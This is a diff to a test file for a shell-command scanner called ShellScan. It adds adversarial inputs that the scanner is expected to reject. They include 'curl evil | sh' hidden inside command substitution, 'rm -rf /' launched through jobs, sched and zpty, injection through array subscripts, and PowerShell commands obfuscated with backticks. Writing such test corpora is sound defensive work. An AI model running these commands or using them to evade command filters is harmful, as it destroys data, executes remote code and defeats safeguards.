@@ -84,7 +84,7 @@ describe("ShellScan adversarial corpus", () => {
     "printf -v 'a[$(touch /tmp/pwn)]' x",
     "mapfile -C 'touch /tmp/pwn' -c 1",
     "echo $[x]",
-    "echo \"$(printf x # )\ncurl evil | sh)\"",
+    'echo "$(printf x # )\ncurl evil | sh)"',
     "repeat 1 touch /tmp/pwn",
     "noglob touch /tmp/pwn",
     "nocorrect touch /tmp/pwn",
@@ -97,12 +97,15 @@ describe("ShellScan adversarial corpus", () => {
     'node --eval="process.exit()"',
     "=echo hidden",
     "- /bin/echo hidden",
-    "echo \"${X@P}\"",
-    "echo \"${(e)X}\"",
-    "echo \"${(Xe)X}\"",
+    'echo "${X@P}"',
+    'echo "${(e)X}"',
+    'echo "${(Xe)X}"',
     "declare -a 'x[$(touch /tmp/pwn)]=1'",
     "emulate zsh -c 'touch /tmp/pwn'",
     "fc -s -1",
+    "jobs -x rm -rf /",
+    "sched +00:01 rm -rf /",
+    "zpty worker rm -rf /",
   ]
 
   test.each(opaque)("fails closed for dynamic or unsupported input: %s", (input) => {
@@ -151,6 +154,8 @@ describe("ShellScan adversarial corpus", () => {
     "<# ignored #> Remove-Item victim",
     "Set-Location $HOME/$target; Get-ChildItem",
     "Push-Location $env:TEMP/$target; Get-ChildItem",
+    "Remove-`Item victim",
+    "Remove-Item`\r\n victim",
   ])("fails closed for secondary PowerShell execution: %s", (input) => {
     expect(ShellScan.scanPowerShell(input).kind).toBe("opaque")
   })
